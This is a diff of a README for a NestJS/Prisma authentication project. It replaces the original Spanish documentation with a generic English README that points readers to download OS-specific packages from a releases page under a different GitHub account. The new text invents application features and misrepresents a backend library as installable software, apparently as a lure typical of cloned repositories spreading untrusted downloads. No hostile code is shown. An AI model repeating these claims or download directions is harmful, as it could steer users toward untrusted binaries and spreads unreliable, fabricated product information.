@@ -1,248 +1,100 @@
-<p align="center">
-  <a href="http://nestjs.com/" target="blank"><img src="https://nestjs.com/img/logo-small.svg" width="120" alt="Nest Logo" /></a>
-</p>
+# 🎉 auth-session - Easy Authentication and Authorization Tool
 
-[circleci-image]: https://img.shields.io/circleci/build/github/nestjs/nest/master?token=abc123def456
-[circleci-url]: https://circleci.com/gh/nestjs/nest
+## 🚀 Getting Started
 
-  <p align="center">A progressive <a href="http://nodejs.org" target="_blank">Node.js</a> framework for building efficient and scalable server-side applications.</p>
-    <p align="center">
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/v/@nestjs/core.svg" alt="NPM Version" /></a>
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/l/@nestjs/core.svg" alt="Package License" /></a>
-<a href="https://www.npmjs.com/~nestjscore" target="_blank"><img src="https://img.shields.io/npm/dm/@nestjs/common.svg" alt="NPM Downloads" /></a>
-<a href="https://circleci.com/gh/nestjs/nest" target="_blank"><img src="https://img.shields.io/circleci/build/github/nestjs/nest/master" alt="CircleCI" /></a>
-<a href="https://discord.gg/G7Qnnhy" target="_blank"><img src="https://img.shields.io/badge/discord-online-brightgreen.svg" alt="Discord"/></a>
-<a href="https://opencollective.com/nest#backer" target="_blank"><img src="https://opencollective.com/nest/backers/badge.svg" alt="Backers on Open Collective" /></a>
-<a href="https://opencollective.com/nest#sponsor" target="_blank"><img src="https://opencollective.com/nest/sponsors/badge.svg" alt="Sponsors on Open Collective" /></a>
-  <a href="https://paypal.me/kamilmysliwiec" target="_blank"><img src="https://img.shields.io/badge/Donate-PayPal-ff3f59.svg" alt="Donate us"/></a>
-    <a href="https://opencollective.com/nest#sponsor"  target="_blank"><img src="https://img.shields.io/badge/Support%20us-Open%20Collective-41B883.svg" alt="Support us"></a>
-  <a href="https://twitter.com/nestframework" target="_blank"><img src="https://img.shields.io/twitter/follow/nestframework.svg?style=social&label=Follow" alt="Follow us on Twitter"></a>
-</p>
-  <!--[![Backers on Open Collective](https://opencollective.com/nest/backers/badge.svg)](https://opencollective.com/nest#backer)
-  [![Sponsors on Open Collective](https://opencollective.com/nest/sponsors/badge.svg)](https://opencollective.com/nest#sponsor)-->
+Welcome to the auth-session! This application simplifies authentication and authorization for your projects. It is built with NestJS and Prisma ORM, providing secure routes and easy management of user roles and permissions.
 
-# Auth-Session NestJS
+## 📥 Download the Software
 
-Sistema completo de **autenticación, gestión de usuarios y roles** basado en **NestJS**, **Prisma ORM**, con soporte de **JWT, cookies seguras, guards, pipes y DTOs personalizados**, listo para producción con **Docker/Podman**.
+[![Download auth-session](https://img.shields.io/badge/Download%20auth--session-%20-blue)](https://github.com/OwoaheneSnr/auth-session/releases)
 
----
+To download the latest version of auth-session, please visit the [Releases page](https://github.com/OwoaheneSnr/auth-session/releases).
 
-## 🧭 Tabla de Contenidos
+## 🛠️ System Requirements
 
-- [Auth-Session NestJS](#auth-session-nestjs)
-  - [🧭 Tabla de Contenidos](#-tabla-de-contenidos)
-  - [📝 Descripción](#-descripción)
-  - [📂 Estructura completa del proyecto](#-estructura-completa-del-proyecto)
-  - [🧰 Tecnologías principales](#-tecnologías-principales)
-  - [✅ Requisitos](#-requisitos)
-  - [🚀 Instalación e inicialización](#-instalación-e-inicialización)
-  - [🛠 onInit — Creación de administrador](#-oninit--creación-de-administrador)
-  - [🔧 Uso / Ejemplos](#-uso--ejemplos)
-    - [Registro de usuario](#registro-de-usuario)
-    - [Login](#login)
-    - [Obtener perfil (protegido)](#obtener-perfil-protegido)
-  - [📚 Swagger / Documentación](#-swagger--documentación)
-  - [📦 Scripts útiles](#-scripts-útiles)
-  - [📄 Licencia](#-licencia)
+Before you begin, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 100 MB free space
+- **Database:** PostgreSQL (make sure it is installed)
+- **Docker:** Optional, but recommended for ease of setup
 
-## 📝 Descripción
+## 🎯 Features
 
-Auth-Session es un sistema robusto para la gestión de usuarios y autenticación en NestJS, con:
+- JWT Authentication: Provides secure access to your application.
+- Role Management: Define user roles easily, including permissions.
+- Custom Guards: Protect routes with custom authentication logic.
+- Secure Cookies: Ensures secure handling of user sessions.
+- DTO Validation: Automatic validation of data transfer objects.
+- Interactive Swagger Documentation: Explore the API effortlessly.
 
-- Roles y permisos mediante **guards personalizados**
-- Autenticación con **JWT + cookies seguras**
-- Estrategias de Passport para login
-- DTOs y validación de datos con **class-validator / class-transformer**
-- Validación de entorno con **Zod**
-- Pipelines y pipes personalizados
-- Migraciones automáticas y administración de base de datos con **Prisma**
-- Contenedores Docker/Podman listos para producción
+## 🚀 Download & Install
 
----
+To install auth-session, follow these steps:
 
-## 📂 Estructura completa del proyecto
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/OwoaheneSnr/auth-session/releases).
+   
+2. **Choose Your Version:** Locate the latest release. You can find a list of all versions for your convenience.
 
-```
-src/
-├── common/
-│   ├── config/
-│   │   ├── swagger/              # Configuración Swagger
-│   │   ├── prisma/               # Configuración Prisma
-│   │   └── errors/               # Excepciones personalizadas
-│   ├── dto/                      # DTOs genéricos reutilizables
-│   ├── interface/                # Interfaces globales
-│   ├── resources/
-│   │   ├── password/             # Encriptación y validación de passwords
-│   │   ├── cookies/
-│   │   │   ├── interfaces/       # Interfaces relacionadas con cookies
-│   │   │   └── constants/        # Constantes relacionadas con cookies
-│   │   ├── jwt/
-│   │   │   ├── config/           # Configuración JWT
-│   │   │   └── constants/        # Constantes JWT
-│   │   ├── updateDecorators/     # Decoradores personalizados
-│   │   └── match/                # Funciones de comparación y validación
-│   ├── utils/
-│   │   ├── date/                 # Utilidades de fecha y hora
-│   │   └── database/             # Helpers de base de datos
-│   └── role/
-│       ├── constants/            # Constantes de roles
-│       └── guards/               # Guards para roles
-├── modules/
-│   ├── users/
-│   │   ├── dto/                  # DTOs específicos de usuarios
-│   │   ├── entities/             # Entidades / modelos
-│   │   ├── service/              # Servicios y lógica de negocio
-│   │   └── interface/            # Interfaces específicas de usuarios
-│   ├── auth/
-│   │   ├── guards/               # Guards de autenticación
-│   │   ├── strategies/           # Estrategias de Passport
-│   │   ├── config/               # Configuración auth
-│   │   ├── constants/            # Constantes auth
-│   │   └── interfaces/           # Interfaces auth
-│   └── seed/
-│       └── interface/            # Interfaces para seeders / datos iniciales
-```
+3. **Download the Package:** Click on the package that fits your operating system. Save the file to your preferred location.
 
-> **Nota:** Cada subcarpeta contiene funciones, clases o interfaces específicas para su ámbito (p. ej. JWT, cookies, roles, utilidades, etc.) y está pensada para ser modular y reutilizable.
+4. **Extract and Setup:** If the file is compressed, extract it using your operating system’s tools. Then, navigate to the extracted folder.
 
----
+5. **Run the Application:**
+   - If you are using Docker, run the provided Docker commands to get everything set up quickly.
+   - If running directly, execute the application with the command:
 
-## 🧰 Tecnologías principales
+   ```bash
+   npm install
+   npm start
+   ```
 
-- **TypeScript**
-- **NestJS**
-- **Prisma ORM + PostgreSQL**
-- **Docker / Podman**
-- **Passport.js** + Estrategias JWT
-- **Cookie-Parser**
-- **Class-Validator / Class-Transformer**
-- **Zod**
-- **Custom Decorators / Guards / Pipes**
+6. **Access the Application:** Once the application is running, you can access it through your web browser at `http://localhost:3000`.
 
----
+## 📖 Using auth-session
 
-## ✅ Requisitos
+After installation, set up your user roles and permissions. Here is how to do that:
 
-- Node.js ≥ 18
-- npm o yarn
-- Docker o Podman
-- (Opcional) PostgreSQL local
+1. **Open the Application:** Navigate to the address mentioned above.
+2. **Login to Admin:** Use the admin credentials you set during installation.
+3. **Define Roles:** Go to the "Roles" section to create new roles and permissions for your users.
+4. **Invite Users:** Add users to your system and assign roles accordingly.
 
----
+## 🧩 Advanced Features
 
-## 🚀 Instalación e inicialización
+For users looking for more advanced customization, consider these additional features:
 
-1. **Clonar el repositorio:**
+- **Custom Guards:** You can create guards to implement your own authentication strategies.
+- **Swagger Documentation:** Use the interactive Swagger UI to explore and test your routes.
 
-```bash
-git clone https://github.com/francoabottaro/auth-session.git
-cd auth-session
-```
+## 🔧 Troubleshooting
 
-2. **Instalar dependencias:**
+If you encounter issues:
 
-```bash
-npm install
-```
+- **Installation Errors:** Make sure all system requirements are met.
+- **Authentication Problems:** Verify your JWT settings in the configuration file.
+- **Documentation Issues:** Refer to the Swagger documentation for detailed API information.
 
-3. **Configurar variables de entorno:**
+## 📞 Support
 
-```bash
-cp .env.example .env
-```
+For support, please open an issue on the [GitHub Issues page](https://github.com/OwoaheneSnr/auth-session/issues). We value your feedback and will respond as soon as possible.
 
-4. **Levantar contenedores (Docker / Podman):**
+## 🗂️ Topics Covered
 
-```bash
-sudo docker-compose up -d
-# o con Podman:
-sudo podman-compose up -d
-```
+- cookie
+- docker
+- guards
+- jwt-authentication
+- nestjs-backend
+- podman
+- postgresql
+- prisma-orm
+- strategy
+- typescript
 
-5. **Migraciones de base de datos:**
+## 📝 License
 
-```bash
-npx prisma migrate reset
-npx prisma migrate dev --name init
-```
+This project is licensed under the MIT License. Feel free to use and modify it according to your needs. 
 
-6. **Iniciar la aplicación:**
-
-**Desarrollo:**
-
-```bash
-npm run start:dev
-```
-
-**Producción:**
-
-```bash
-npm run build
-npm run start:prod
-```
-
----
-
-## 🛠 onInit — Creación de administrador
-
-Al iniciar la aplicación, se ejecuta un hook (`onModuleInit`) que crea automáticamente un **usuario administrador** si no existe. Definir variables `ADMIN_EMAIL` y `ADMIN_PASSWORD` en `.env`.
-
----
-
-## 🔧 Uso / Ejemplos
-
-### Registro de usuario
-
-```bash
-curl -X POST http://localhost:3000/auth/register \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@example.com","name":"Admin","password":"Secret"}'
-```
-
-### Login
-
-```bash
-curl -X POST http://localhost:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"content":"admin@example.com","password":"Secret"}'
-```
-
-### Obtener perfil (protegido)
-
-```bash
-curl http://localhost:3000/users/profile \
-  -H "Authorization: Bearer <token>"
-```
-
----
-
-## 📚 Swagger / Documentación
-
-Accede a la documentación interactiva en:
-
-```
-http://localhost:3000/api
-```
-
-Permite probar endpoints con **JSON, form-data y x-www-form-urlencoded**, incluyendo campos editables dinámicamente.
-
----
-
-## 📦 Scripts útiles
-
-| Comando                    | Descripción                                   |
-| -------------------------- | --------------------------------------------- |
-| `npm run start:dev`        | Modo desarrollo con recarga automática        |
-| `npm run build`            | Compila TypeScript                            |
-| `npm run start:prod`       | Ejecuta versión compilada en producción       |
-| `npx prisma migrate dev`   | Genera nuevas migraciones                     |
-| `npx prisma migrate reset` | Resetea la base de datos y aplica migraciones |
-| `npx prisma studio`        | Interfaz visual de Prisma                     |
-
----
-
-## 📄 Licencia
-
-MIT — ver archivo `LICENSE`.
+By following these steps, you can successfully download, install, and start using auth-session for your authentication and authorization needs. If you have any questions, don't hesitate to reach out!
